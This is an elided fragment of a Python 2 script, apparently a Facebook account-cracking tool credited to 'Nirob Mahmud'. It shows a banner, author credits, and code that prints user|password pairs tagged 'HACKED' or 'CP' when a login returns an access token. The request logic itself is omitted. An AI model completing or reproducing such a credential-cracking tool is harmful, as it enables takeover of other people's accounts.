#Tools Created By Nirob Mahmud

#Nirob Technology Channel
...
\033[0;94m |  \| |_ _ __ ___ | |__  

\033[0;96m | . ` | | '__/ _ \| '_ \ 

\033[0;96m | |\  | | | | (_) | |_) |

\033[0;96m \_| \_/_|_|  \___/|_.__/ 

"""

print("\033[0;91mThis Tool's Free By Nirob Mahmud")
...
def menu():
    ...
    print '\033[0;93mAUTHOR   : Nirob Mahmud'

    print '\033[0;94mFACEBOOK : Mr. Nirob Mahmud'

    print '\033[0;96mGITHUB   : NirobMahmud5612'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;92m[Nirob-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                ...
                print '\x1b[1;91m[Nirob-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
